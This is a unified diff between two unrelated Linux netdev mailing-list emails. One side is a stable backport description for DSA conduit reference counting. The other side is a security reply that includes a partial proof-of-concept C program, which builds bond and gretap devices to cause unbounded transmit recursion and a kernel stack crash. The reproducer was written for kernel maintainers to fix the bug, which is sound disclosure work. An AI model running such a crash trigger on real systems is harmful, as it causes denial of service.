@@ -1,579 +1,400 @@
-Return-Path: <netdev+bounces-263046-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-263047-lists+netdev=lfdr.de@vger.kernel.org>
 Delivered-To: lists+netdev@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id iGUxO0RspmnMPgAAu9opvQ
-	(envelope-from <netdev+bounces-263046-lists+netdev=lfdr.de@vger.kernel.org>)
-	for <lists+netdev@lfdr.de>; Tue, 03 Mar 2026 06:06:12 +0100
+	id gy39CyF3pmnxQAAAu9opvQ
+	(envelope-from <netdev+bounces-263047-lists+netdev=lfdr.de@vger.kernel.org>)
+	for <lists+netdev@lfdr.de>; Tue, 03 Mar 2026 06:52:33 +0100
 X-Original-To: lists+netdev@lfdr.de
-Received: from sto.lore.kernel.org (sto.lore.kernel.org [IPv6:2600:3c09:e001:a7::12fc:5321])
-	by mail.lfdr.de (Postfix) with ESMTPS id 8120E1E91AD
-	for <lists+netdev@lfdr.de>; Tue, 03 Mar 2026 06:06:12 +0100 (CET)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id 395971E9511
+	for <lists+netdev@lfdr.de>; Tue, 03 Mar 2026 06:52:32 +0100 (CET)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sto.lore.kernel.org (Postfix) with ESMTP id 772E3300D740
-	for <lists+netdev@lfdr.de>; Tue,  3 Mar 2026 05:06:11 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id B768C303AB7F
+	for <lists+netdev@lfdr.de>; Tue,  3 Mar 2026 05:52:30 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 8D246282F05;
-	Tue,  3 Mar 2026 05:06:09 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id EAF6F7262F;
+	Tue,  3 Mar 2026 05:52:29 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="UtcdxhF8"
+	dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b="lIMuLjJ+"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-dl1-f47.google.com (mail-dl1-f47.google.com [74.125.82.47])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from m16.mail.163.com (m16.mail.163.com [117.135.210.5])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AC2451990A7
-	for <netdev@vger.kernel.org>; Tue,  3 Mar 2026 05:06:07 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.47
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 14D7029A2;
+	Tue,  3 Mar 2026 05:52:24 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=117.135.210.5
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1772514369; cv=none; b=nquTnUDwbeXeXzxG4Gs/YeZInvlw/HWDPKkAEzJ4jJHO33dRpAXGxJbfJ2xe11+J/OIxHhngx2v+Tqe+LwkaCUI2c/AiXuB51Mugu3DxlvgdgihRpKBif5Nkkn/SXf9rLtTD9RR+huKYO6taFBSCeNSCnMutDr30pTI4nvyyNvs=
+	t=1772517149; cv=none; b=GtkVnYwxdgvunD9G2qziF4wJR8GGgG5hm/b+bZsZOvrbpl970bKjmRAIQKg+1wZlQPA359Youm7JvGbY7rg1zeZc4JMXcUDYerUE3gsOANkspLlx/Au7uUYk/b5xvcOGCH/Y5URthdRlfTmZVWesR3B7x7RDo+I7Ilkl2IqgaVA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1772514369; c=relaxed/simple;
-	bh=nTkSs4UmhmF2Jg4DsbGhlHj+YDFT3Q5ui/cSxZjFAPk=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=sYT7BQ0kgNRqmRl2q8ZFGDyJb6D6QvKtIaCVRmxOfcE4+5DWvSuVryQ+MmpaVCYfjUBN5iztaOter/9gaVrunvXDvMr3vjSAGV/QRtLUJMzGKnhPQlEsU00lke5n533HHdLQguTWsC2kiSsVDCtQDceYxJqir/xnKoUb+HGBFww=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=UtcdxhF8; arc=none smtp.client-ip=74.125.82.47
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
-Received: by mail-dl1-f47.google.com with SMTP id a92af1059eb24-12732e6a123so910412c88.1
-        for <netdev@vger.kernel.org>; Mon, 02 Mar 2026 21:06:07 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=asu.edu; s=google; t=1772514367; x=1773119167; darn=vger.kernel.org;
-        h=in-reply-to:content-transfer-encoding:content-disposition
-         :mime-version:references:message-id:subject:cc:to:from:date:from:to
-         :cc:subject:date:message-id:reply-to;
-        bh=YS39wDVmqFmK7ipo9+4K/tYrftqOUm/LN5bWx4uTMU0=;
-        b=UtcdxhF8IvHjlC0LOFPQaF+IQO0cukO6H+YOvZWcYur8/oX2Bd9gYVaXh1jOSG5t1U
-         zKik4kB3vZsjrdxTyoYOXI6mjM5FdOoA/ONgScbTLxLJF46MpQ5V3eAXFujC6mHE+iTw
-         0ryGHyctxDjmZdmV6LHWqMGArH6T6WKbYrFVtgF2m2bGoXlS0zjN3DWoe204i5tVLcM+
-         KF0xEHpbo0rYjAx8/q72tl9CBrZszNsXtNBpIBuz1DV4lQoMEi9YCNsT47qJ0d7rLNqV
-         FJnQniMXqjpJt6PKNCAuwEEAOKeIRQWsKInkbIweBELcfKpSWDJIAHOvE9sFSlfOQOSO
-         qmYA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1772514367; x=1773119167;
-        h=in-reply-to:content-transfer-encoding:content-disposition
-         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=YS39wDVmqFmK7ipo9+4K/tYrftqOUm/LN5bWx4uTMU0=;
-        b=qnQp9GvG6zXBNZR0QfrtCH0qtCwH3gO0nabCfbN8FMqvkCo3xXQ0vYT0AR8i7SoJou
-         3W4cIaNUnmchgraXgbFMf8Z3vFzMVbK9I0KUoBaMmJsMOtYtLWRxgvzhlolJunEe7FeX
-         j32BktigrQJq4KvY60zJG2gdBS65qx5lQTXNIv7j5eGGYAF0drPEGH3YMWOkWmusWpTE
-         EE76V+jLs9QdJfBt5a0Yep6WTecPAVwJogoRdJfAz5mnB2a2o3duPwief9Hm6CBz3VRf
-         fqvg/Yu14mqJRaHtLPpo94G7eOpM+cee47DwybZRCRh4Vniaszh2ni/v9oEftHNoWiXs
-         xozQ==
-X-Forwarded-Encrypted: i=1; AJvYcCV4XBXc2ghTNExIvt1I6j2C1oi3iHT+vFZAoNuNCnLnKAbRUG1V4+5oB/TEZlhgcZMdbcs/6z0=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzB3IroIf8W5BNRVAO3EoicSRM5p2eRAoX6AIw8/u1n7Fm247yO
-	G6waLoOvMTt2Vpawn2p3IEt2IaCI2BDiePnIeZrxHejADGGU4dQJKJybwxjx0StoJQ==
-X-Gm-Gg: ATEYQzyuXirWp9alTWc3z7edlde/tSO7WfL7IUYahyGHYd8MD2+TyFXhysv2cEWZPJk
-	dAFTk4p1IGWzD7TnWAT8J3WwSzHx9HjEp1kvXP/fFCFO5EqJUG5fiW8zQJul9ST/AwB31Wunre/
-	sjmFu6mpv90VR0pPwUc9j8yswsKSmGWOwl4rh5wXOcY39e1LJbVTDFhD5EAdWcyLpgDH5Yhnd2A
-	DsmxuPkl5KRnJz9q0OARszylpYCMVlQuM9xhbAVdz0lf6nK6W/7OxpeKe5JN3gDPBM6IMuWwFMS
-	hk+Xu13cwztUPtuIAKYQTmkyUdubJVfWregwiSwrL8ec2VeJ2WZBWKtH1CsEluVrU0EN+YgUVmK
-	UpoF0ZrQmfVQ/TLXwa+/0BKclkakHtYl7m4oAE3RNiMf5PMmr0QPsB4RUvKmldGtoTR+idC7KUN
-	W8GtvqRXdLh9Io2hURqJGSCGo0CzNLdg==
-X-Received: by 2002:a05:7022:7a5:b0:127:3480:7c9e with SMTP id a92af1059eb24-1278fc99574mr6418284c88.8.1772514366584;
-        Mon, 02 Mar 2026 21:06:06 -0800 (PST)
-Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
-        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1279cbd1993sm6889996c88.2.2026.03.02.21.06.05
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 02 Mar 2026 21:06:06 -0800 (PST)
-Date: Mon, 2 Mar 2026 22:06:04 -0700
-From: Xiang Mei <xmei5@asu.edu>
-To: Eric Dumazet <edumazet@google.com>
-Cc: bestswngs@gmail.com, security@kernel.org, davem@davemloft.net, 
-	kuba@kernel.org, pabeni@redhat.com, horms@kernel.org, netdev@vger.kernel.org, 
+	s=arc-20240116; t=1772517149; c=relaxed/simple;
+	bh=srsGL27ODkb32v+jJnRQHGZJU3/SbDJAk4aL/3CdEAQ=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=QILFVf2A55Us50IsBKfbPhoMA6sZXYiO7TZXJwDKY5OKsV/jsfwGYr7VaQmfR5fAXQEKnqIaxa0IMBMd3+rpaVdXvrPX7fogegwNR6bjpKFwZ2rgQs4mZVyAU+kPs3tAx0XOlFk5e3jc3JmyT4J9yb16YN6xWds6nado4ZFb/jI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com; spf=pass smtp.mailfrom=163.com; dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b=lIMuLjJ+; arc=none smtp.client-ip=117.135.210.5
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=163.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
+	s=s110527; h=From:To:Subject:Date:Message-Id:MIME-Version; bh=9j
+	neQjI3DzzG0MEdCPF569r0V3d6StOOexg2c0rY+3M=; b=lIMuLjJ+FfznC1uk5y
+	++eDeP0uTPAmap6S9FO4Aqmyay1nA4H18oID3yG9Cr0ZVraBHKp0DL+BPNplPNmZ
+	MV4N50kjTeJzLaR20ZLq0P0UtpLV73BFJK211xYR+AM0ZunMXgil0ZjB9ulB+M2k
+	f5/vftsmJK3KWIs4h9qTUjgWM=
+Received: from pek-lpg-core5.wrs.com (unknown [])
+	by gzsmtp3 (Coremail) with SMTP id PigvCgA3CNnXdqZpLe3SRA--.197S2;
+	Tue, 03 Mar 2026 13:51:23 +0800 (CST)
+From: Robert Garcia <rob_garcia@163.com>
+To: stable@vger.kernel.org,
+	Vladimir Oltean <vladimir.oltean@nxp.com>
+Cc: Paolo Abeni <pabeni@redhat.com>,
+	Ma Ke <make24@iscas.ac.cn>,
+	Robert Garcia <rob_garcia@163.com>,
+	Jonas Gorski <jonas.gorski@gmail.com>,
+	"David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Simon Horman <horms@kernel.org>,
+	Russell King <linux@armlinux.org.uk>,
+	Florian Fainelli <f.fainelli@gmail.com>,
+	netdev@vger.kernel.org,
 	linux-kernel@vger.kernel.org
-Subject: Re: [PATCH net] net/core: add xmit recursion limit to qdisc transmit
- path
-Message-ID: <uaearjv7z3u5e3hks775qzlzoxcxsrhd3vl2rc3xo7n2mntlfd@ostyhlddj2a4>
-References: <20260303022947.3061602-2-bestswngs@gmail.com>
- <CANn89i+mK-CqGPeW65RBeOe2R-YjqjxU9W9AGbvV1Ef+HS4DtA@mail.gmail.com>
+Subject: [PATCH 6.12.y] net: dsa: properly keep track of conduit reference
+Date: Tue,  3 Mar 2026 13:51:20 +0800
+Message-Id: <20260303055120.2111614-1-rob_garcia@163.com>
+X-Mailer: git-send-email 2.34.1
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
 Content-Transfer-Encoding: 8bit
-In-Reply-To: <CANn89i+mK-CqGPeW65RBeOe2R-YjqjxU9W9AGbvV1Ef+HS4DtA@mail.gmail.com>
-X-Rspamd-Queue-Id: 8120E1E91AD
+X-CM-TRANSID:PigvCgA3CNnXdqZpLe3SRA--.197S2
+X-Coremail-Antispam: 1Uf129KBjvJXoWfGF4rtr15Aw4xCF4furWkCrg_yoWkAw4xpF
+	43Ga43t3ykG3y7Grs8Wa1UuFyrAw4Fyay3G34UK34furn8Gry0yry8KFZa9345CrZ3GF9x
+	XFZ8Za4rCFZ8ZFJanT9S1TB71UUUUU7qnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
+	9KBjDUYxBIdaVFxhVjvjDU0xZFpf9x07UxnYwUUUUU=
+X-CM-SenderInfo: 5uresw5dufxti6rwjhhfrp/xtbDAR3YRGmmdt3QvgAA3K
+X-Rspamd-Queue-Id: 395971E9511
 X-Rspamd-Server: lfdr
-X-Spamd-Result: default: False [-1.66 / 15.00];
+X-Spamd-Result: default: False [0.84 / 15.00];
+	SUSPICIOUS_RECIPS(1.50)[];
 	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
-	MID_RHS_NOT_FQDN(0.50)[];
-	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
-	R_SPF_ALLOW(-0.20)[+ip6:2600:3c09:e001:a7::/64:c];
-	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
+	MID_CONTAINS_FROM(1.00)[];
+	DMARC_POLICY_ALLOW(-0.50)[163.com,none];
+	R_MISSING_CHARSET(0.50)[];
+	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64];
+	R_DKIM_ALLOW(-0.20)[163.com:s=s110527];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	FREEMAIL_CC(0.00)[gmail.com,kernel.org,davemloft.net,redhat.com,vger.kernel.org];
-	TAGGED_FROM(0.00)[bounces-263046-lists,netdev=lfdr.de];
-	FROM_HAS_DN(0.00)[];
-	DKIM_TRACE(0.00)[asu.edu:+];
+	TAGGED_FROM(0.00)[bounces-263047-lists,netdev=lfdr.de];
+	FREEMAIL_FROM(0.00)[163.com];
 	RCVD_TLS_LAST(0.00)[];
-	MIME_TRACE(0.00)[0:+];
+	RCPT_COUNT_TWELVE(0.00)[14];
 	FORGED_SENDER_MAILLIST(0.00)[];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	ASN(0.00)[asn:63949, ipnet:2600:3c09::/32, country:SG];
+	MIME_TRACE(0.00)[0:+];
+	RCVD_COUNT_THREE(0.00)[4];
+	DKIM_TRACE(0.00)[163.com:+];
 	TO_DN_SOME(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
 	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
-	MISSING_XM_UA(0.00)[];
-	NEURAL_HAM(-0.00)[-0.994];
+	FROM_NEQ_ENVFROM(0.00)[rob_garcia@163.com,netdev@vger.kernel.org];
+	FROM_HAS_DN(0.00)[];
+	FREEMAIL_CC(0.00)[redhat.com,iscas.ac.cn,163.com,gmail.com,davemloft.net,google.com,kernel.org,armlinux.org.uk,vger.kernel.org];
+	NEURAL_HAM(-0.00)[-1.000];
+	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
 	TAGGED_RCPT(0.00)[netdev];
-	RCPT_COUNT_SEVEN(0.00)[9];
-	RCVD_VIA_SMTP_AUTH(0.00)[];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[sto.lore.kernel.org:rdns,sto.lore.kernel.org:helo,asu.edu:dkim]
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[nxp.com:email,iscas.ac.cn:email,sea.lore.kernel.org:rdns,sea.lore.kernel.org:helo,msgid.link:url]
 X-Rspamd-Action: no action
 
-On Tue, Mar 03, 2026 at 05:30:11AM +0100, Eric Dumazet wrote:
-> On Tue, Mar 3, 2026 at 3:37 AM <bestswngs@gmail.com> wrote:
-> >
-> > From: Weiming Shi <bestswngs@gmail.com>
-> >
-> > __dev_queue_xmit() has two transmit code paths depending on whether the
-> > device has a qdisc attached:
-> >
-> >   1. Qdisc path (q->enqueue): calls __dev_xmit_skb()
-> >   2. No-qdisc path: calls dev_hard_start_xmit() directly
-> >
-> > Commit 745e20f1b626 ("net: add a recursion limit in xmit path") added
-> > recursion protection to the no-qdisc path via dev_xmit_recursion()
-> > check and dev_xmit_recursion_inc()/dec() tracking. However, the qdisc
-> > path performs no recursion depth checking at all.
-> >
-> > This allows unbounded recursion through qdisc-attached devices. For
-> > example, a bond interface in broadcast mode with gretap slaves whose
-> > remote endpoints route back through the bond creates an infinite
-> > transmit loop that exhausts the kernel stack:
-> 
-> Non lltx drivers would deadlock in HARD_TX_LOCK().
-> 
-> I would prefer we try to fix this issue at configuration time instead
-> of adding yet another expensive operations in the fast path.
->
-Thanks for the review and advice.
-Weiming is going to discuss more about the paching when he get back to his
-computer.
+From: Vladimir Oltean <vladimir.oltean@nxp.com>
 
-> Can you provide a test ?
+[ Upstream commit 06e219f6a706c367c93051f408ac61417643d2f9 ]
 
-Here is a PoC. It may trigger other crashes since the uncontrolled stack
-increasing, the expected crash is 
-"BUG: KASAN: stack-out-of-bounds in __unwind_start+0x2f/0x7a0".
+Problem description
+-------------------
 
-```c
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <linux/netlink.h>
-#include <linux/rtnetlink.h>
-#include <linux/if_link.h>
-#include <linux/if_tunnel.h>
-#include <linux/ip.h>
-#include <linux/neighbour.h>
-#include <arpa/inet.h>
-#include <sched.h>
+DSA has a mumbo-jumbo of reference handling of the conduit net device
+and its kobject which, sadly, is just wrong and doesn't make sense.
 
-extern unsigned int if_nametoindex(const char *__ifname);
+There are two distinct problems.
 
-#ifndef IFF_UP
-#define IFF_UP 0x1
-#endif
+1. The OF path, which uses of_find_net_device_by_node(), never releases
+   the elevated refcount on the conduit's kobject. Nominally, the OF and
+   non-OF paths should result in objects having identical reference
+   counts taken, and it is already suspicious that
+   dsa_dev_to_net_device() has a put_device() call which is missing in
+   dsa_port_parse_of(), but we can actually even verify that an issue
+   exists. With CONFIG_DEBUG_KOBJECT_RELEASE=y, if we run this command
+   "before" and "after" applying this patch:
 
-struct nlmsg {
-    char *pos;
-    int nesting;
-    struct nlattr *nested[8];
-    char buf[8192];
-};
+(unbind the conduit driver for net device eno2)
+echo 0000:00:00.2 > /sys/bus/pci/drivers/fsl_enetc/unbind
 
-static void nl_init(struct nlmsg *nlmsg, int typ, int flags,
-                    const void *data, int size)
-{
-    memset(nlmsg, 0, sizeof(*nlmsg));
-    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
-    hdr->nlmsg_type = typ;
-    hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
-    memcpy(hdr + 1, data, size);
-    nlmsg->pos = (char *)(hdr + 1) + NLMSG_ALIGN(size);
-}
+we see these lines in the output diff which appear only with the patch
+applied:
 
-static void nl_attr(struct nlmsg *nlmsg, int typ, const void *data, int size)
-{
-    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
-    attr->nla_len = sizeof(*attr) + size;
-    attr->nla_type = typ;
-    if (size > 0)
-        memcpy(attr + 1, data, size);
-    nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
-}
+kobject: 'eno2' (ffff002009a3a6b8): kobject_release, parent 0000000000000000 (delayed 1000)
+kobject: '109' (ffff0020099d59a0): kobject_release, parent 0000000000000000 (delayed 1000)
 
-static void nl_nest(struct nlmsg *nlmsg, int typ)
-{
-    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
-    attr->nla_type = typ;
-    nlmsg->pos += sizeof(*attr);
-    nlmsg->nested[nlmsg->nesting++] = attr;
-}
+2. After we find the conduit interface one way (OF) or another (non-OF),
+   it can get unregistered at any time, and DSA remains with a long-lived,
+   but in this case stale, cpu_dp->conduit pointer. Holding the net
+   device's underlying kobject isn't actually of much help, it just
+   prevents it from being freed (but we never need that kobject
+   directly). What helps us to prevent the net device from being
+   unregistered is the parallel netdev reference mechanism (dev_hold()
+   and dev_put()).
 
-static void nl_done(struct nlmsg *nlmsg)
-{
-    struct nlattr *attr = nlmsg->nested[--nlmsg->nesting];
-    attr->nla_len = nlmsg->pos - (char *)attr;
-}
+Actually we actually use that netdev tracker mechanism implicitly on
+user ports since commit 2f1e8ea726e9 ("net: dsa: link interfaces with
+the DSA master to get rid of lockdep warnings"), via netdev_upper_dev_link().
+But time still passes at DSA switch probe time between the initial
+of_find_net_device_by_node() code and the user port creation time, time
+during which the conduit could unregister itself and DSA wouldn't know
+about it.
 
-static int nl_send(struct nlmsg *nlmsg, int sock)
-{
-    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
-    hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;
+So we have to run of_find_net_device_by_node() under rtnl_lock() to
+prevent that from happening, and release the lock only with the netdev
+tracker having acquired the reference.
 
-    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
-    ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
-                       (struct sockaddr *)&addr, sizeof(addr));
-    if (n != (ssize_t)hdr->nlmsg_len)
-        return -1;
+Do we need to keep the reference until dsa_unregister_switch() /
+dsa_switch_shutdown()?
+1: Maybe yes. A switch device will still be registered even if all user
+   ports failed to probe, see commit 86f8b1c01a0a ("net: dsa: Do not
+   make user port errors fatal"), and the cpu_dp->conduit pointers
+   remain valid.  I haven't audited all call paths to see whether they
+   will actually use the conduit in lack of any user port, but if they
+   do, it seems safer to not rely on user ports for that reference.
+2. Definitely yes. We support changing the conduit which a user port is
+   associated to, and we can get into a situation where we've moved all
+   user ports away from a conduit, thus no longer hold any reference to
+   it via the net device tracker. But we shouldn't let it go nonetheless
+   - see the next change in relation to dsa_tree_find_first_conduit()
+   and LAG conduits which disappear.
+   We have to be prepared to return to the physical conduit, so the CPU
+   port must explicitly keep another reference to it. This is also to
+   say: the user ports and their CPU ports may not always keep a
+   reference to the same conduit net device, and both are needed.
 
-    n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
-    if (n < 0)
-        return -1;
-    if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr)))
-        return -1;
+As for the conduit's kobject for the /sys/class/net/ entry, we don't
+care about it, we can release it as soon as we hold the net device
+object itself.
 
-    hdr = (struct nlmsghdr *)nlmsg->buf;
-    if (hdr->nlmsg_type == NLMSG_ERROR) {
-        int err = -((struct nlmsgerr *)(hdr + 1))->error;
-        if (err) {
-            errno = err;
-            return -err;
-        }
-    }
-    return 0;
-}
+History and blame attribution
+-----------------------------
 
-static int create_device(int sock, struct nlmsg *nlmsg, const char *name,
-                         const char *kind)
-{
-    struct ifinfomsg hdr = {};
-    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
-    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
-    nl_nest(nlmsg, IFLA_LINKINFO);
-    nl_attr(nlmsg, IFLA_INFO_KIND, kind, strlen(kind));
-    nl_done(nlmsg);
-    int ret = nl_send(nlmsg, sock);
-    printf("  create %s (%s): %s\n", name, kind, ret ? strerror(errno) : "ok");
-    return ret;
-}
+The code has been refactored so many times, it is very difficult to
+follow and properly attribute a blame, but I'll try to make a short
+history which I hope to be correct.
 
-static int create_bond(int sock, struct nlmsg *nlmsg, const char *name, int mode)
-{
-    struct ifinfomsg hdr = {};
-    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
-    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
-    nl_nest(nlmsg, IFLA_LINKINFO);
-    nl_attr(nlmsg, IFLA_INFO_KIND, "bond", 4);
-    nl_nest(nlmsg, IFLA_INFO_DATA);
-    uint8_t bond_mode = mode;
-    nl_attr(nlmsg, IFLA_BOND_MODE, &bond_mode, sizeof(bond_mode));
-    nl_done(nlmsg);
-    nl_done(nlmsg);
-    int ret = nl_send(nlmsg, sock);
-    printf("  create bond %s (mode=%d): %s\n", name, mode, ret ? strerror(errno) : "ok");
-    return ret;
-}
+We have two distinct probing paths:
+- one for OF, introduced in 2016 in commit 83c0afaec7b7 ("net: dsa: Add
+  new binding implementation")
+- one for non-OF, introduced in 2017 in commit 71e0bbde0d88 ("net: dsa:
+  Add support for platform data")
 
-static int create_gretap(int sock, struct nlmsg *nlmsg, const char *name,
-                         uint32_t remote, int num_tx_queues)
-{
-    struct ifinfomsg hdr = {};
-    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
-    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
-    uint32_t ntxq = num_tx_queues;
-    nl_attr(nlmsg, IFLA_NUM_TX_QUEUES, &ntxq, sizeof(ntxq));
-    nl_nest(nlmsg, IFLA_LINKINFO);
-    nl_attr(nlmsg, IFLA_INFO_KIND, "gretap", 6);
-    nl_nest(nlmsg, IFLA_INFO_DATA);
-    nl_attr(nlmsg, IFLA_GRE_REMOTE, &remote, sizeof(remote));
-    nl_done(nlmsg);
-    nl_done(nlmsg);
-    int ret = nl_send(nlmsg, sock);
-    printf("  create gretap %s (remote, %d txq): %s\n", name, num_tx_queues,
-           ret ? strerror(errno) : "ok");
-    return ret;
-}
+These are both complete rewrites of the original probing paths (which
+used struct dsa_switch_driver and other weird stuff, instead of regular
+devices on their respective buses for register access, like MDIO, SPI,
+I2C etc):
+- one for OF, introduced in 2013 in commit 5e95329b701c ("dsa: add
+  device tree bindings to register DSA switches")
+- one for non-OF, introduced in 2008 in commit 91da11f870f0 ("net:
+  Distributed Switch Architecture protocol support")
 
-static int set_master(int sock, struct nlmsg *nlmsg, const char *slave,
-                      const char *master)
-{
-    struct ifinfomsg hdr = {};
-    hdr.ifi_index = if_nametoindex(slave);
-    if (!hdr.ifi_index) return -1;
-    nl_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
-    int master_idx = if_nametoindex(master);
-    nl_attr(nlmsg, IFLA_MASTER, &master_idx, sizeof(master_idx));
-    int ret = nl_send(nlmsg, sock);
-    printf("  enslave %s -> %s: %s\n", slave, master, ret ? strerror(errno) : "ok");
-    return ret;
-}
+except for tiny bits and pieces like dsa_dev_to_net_device() which were
+seemingly carried over since the original commit, and used to this day.
 
-static int dev_updown(int sock, struct nlmsg *nlmsg, const char *name, int up)
-{
-    struct ifinfomsg hdr = {};
-    hdr.ifi_index = if_nametoindex(name);
-    if (!hdr.ifi_index) return -1;
-    hdr.ifi_flags = up ? IFF_UP : 0;
-    hdr.ifi_change = IFF_UP;
-    nl_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
-    int ret = nl_send(nlmsg, sock);
-    printf("  %s %s: %s\n", up ? "up" : "down", name, ret ? strerror(errno) : "ok");
-    return ret;
-}
+The point is that the original probing paths received a fix in 2015 in
+the form of commit 679fb46c5785 ("net: dsa: Add missing master netdev
+dev_put() calls"), but the fix never made it into the "new" (dsa2)
+probing paths that can still be traced to today, and the fixed probing
+path was later deleted in 2019 in commit 93e86b3bc842 ("net: dsa: Remove
+legacy probing support").
 
-static int add_addr4(int sock, struct nlmsg *nlmsg, const char *dev,
-                     const char *addr_str, int prefix)
-{
-    struct ifaddrmsg hdr = {};
-    hdr.ifa_family = AF_INET;
-    hdr.ifa_prefixlen = prefix;
-    hdr.ifa_scope = RT_SCOPE_UNIVERSE;
-    hdr.ifa_index = if_nametoindex(dev);
-    struct in_addr addr;
-    inet_pton(AF_INET, addr_str, &addr);
-    nl_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
-    nl_attr(nlmsg, IFA_LOCAL, &addr, sizeof(addr));
-    nl_attr(nlmsg, IFA_ADDRESS, &addr, sizeof(addr));
-    int ret = nl_send(nlmsg, sock);
